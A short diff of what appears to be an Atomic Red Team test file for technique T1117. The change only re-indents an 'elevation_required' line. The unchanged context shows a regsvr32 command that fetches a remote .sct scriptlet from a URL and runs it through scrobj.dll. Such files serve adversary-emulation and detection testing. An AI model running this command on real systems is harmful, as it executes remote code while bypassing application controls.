@@ -29,7 +29,7 @@ atomic_tests:
     default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct
   executor:
    name: command_prompt
-    elevation_required: false
+   elevation_required: false
    command: |
     regsvr32.exe /s /u /i:#{url} scrobj.dll
 - name: Regsvr32 local DLL execution
